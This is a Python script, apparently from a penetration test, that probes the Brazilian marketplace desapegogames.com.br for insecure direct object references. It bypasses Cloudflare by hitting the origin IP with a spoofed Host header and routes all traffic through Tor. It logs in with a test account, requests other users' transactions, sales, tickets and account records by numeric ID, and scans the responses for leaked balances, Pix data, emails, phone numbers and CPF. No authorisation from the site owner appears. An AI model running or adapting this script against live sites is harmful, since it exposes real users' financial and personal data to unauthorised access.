#!/usr/bin/env python3
"""
/painel/* IDOR test com conta de teste logada — desapegogames.com.br via bypass CF.
Conta: pttst1788567726ma / Pentest@2026 (criada para validacao, read-only).
"""
import requests, urllib3, re, time
urllib3.disable_warnings()
PROXY={"https":"socks5://127.0.0.1:9050","http":"socks5://127.0.0.1:9050"}
BASE="https://186.226.60.54"
HOSTH="desapegogames.com.br"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"
USER="pttst1788567726ma"
PW="Pentest@2026"

s=requests.Session(); s.proxies.update(PROXY)
h={"Host":HOSTH,"User-Agent":UA}

# 1) login
print(f"[*] login {USER}")
r=s.post(f"{BASE}/login",headers=h,data={"login":USER,"senha":PW},verify=False,timeout=30,allow_redirects=False)
print(f"    login HTTP {r.status_code} loc={r.headers.get('Location','')!r}")
if r.status_code not in (302,303,307):
    print("    login FALHOU"); exit(1)

# 2) mapear /painel/* (modulos)
print(f"\n[*] mapear /painel/* (logado)")
modulos=["anuncios","compras","conta","index","notificacoes","perguntas","tickets","transacoes","vendas","sair"]
for m in modulos:
    r=s.get(f"{BASE}/painel/{m}",headers=h,verify=False,timeout=30,allow_redirects=False)
    print(f"    /painel/{m:15s} -> HTTP {r.status_code} loc={r.headers.get('Location','')[:40]!r} len={len(r.content)}")

# 3) GET /painel (dashboard) — ver estrutura, IDs, links
print(f"\n[*] GET /painel (dashboard) — extrair links/IDs")
r=s.get(f"{BASE}/painel",headers=h,verify=False,timeout=30,allow_redirects=True)
body=r.content.decode('utf-8',errors='replace')
print(f"    dashboard HTTP {r.status_code} len={len(body)}")
# links /painel/...
links=set(re.findall(r'/painel/([a-z]+(?:/\d+)?)',body,re.IGNORECASE))
print(f"    links /painel/ encontrados: {sorted(links)[:30]}")
# IDs numericos no body
ids=set(re.findall(r'/painel/[a-z]+/(\d+)',body,re.IGNORECASE))
print(f"    IDs em /painel/<mod>/ID: {sorted(ids)[:20]}")

# 4) IDOR: /painel/<modulo>/<id> para varios modulos e IDs
print(f"\n[*] IDOR test /painel/<modulo>/<id>")
modulos_idor=["transacoes","vendas","compras","anuncios","tickets","perguntas","conta","notificacoes"]
ids_test=[1,2,3,100,1000,99999,999999]
for mod in modulos_idor:
    for idv in ids_test:
        r=s.get(f"{BASE}/painel/{mod}/{idv}",headers=h,verify=False,timeout=30,allow_redirects=False)
        loc=r.headers.get('Location','')[:50]
        # sinais de vazamento (dados de outro user)
        leak_signals=[]
        b=r.content
        for sig in ["saldo","transa","venda","compra","anuncio","valor","saque","comprovant","pix","conta","email","telefone"]:
            if sig.encode() in b: leak_signals.append(sig)
        print(f"    /painel/{mod}/{idv:6d} -> HTTP {r.status_code} loc={loc!r} len={len(b)} signals={leak_signals[:5]}")
        time.sleep(0.8)

# 5) /painel/conta (dados da propria conta) — ver PII
print(f"\n[*] GET /painel/conta (PII propria)")
r=s.get(f"{BASE}/painel/conta",headers=h,verify=False,timeout=30,allow_redirects=False)
body=r.content.decode('utf-8',errors='replace')
print(f"    HTTP {r.status_code} len={len(body)}")
# extrair campos
for campo in ["nome","email","usuario","cpf","telefone","data_nasc","saldo","endereco"]:
    for m in re.findall(r'(?:name|id|for)="'+campo+r'"[^>]*value="([^"]{0,80})"',body,re.IGNORECASE):
        print(f"    {campo}: {m[:60]}")
    for m in re.findall(r'>\s*'+campo+r'\s*[:>]\s*([^<\n]{1,80})',body,re.IGNORECASE):
        print(f"    {campo}: {m.strip()[:60]}")

print("\n[*] /painel IDOR test concluido.")
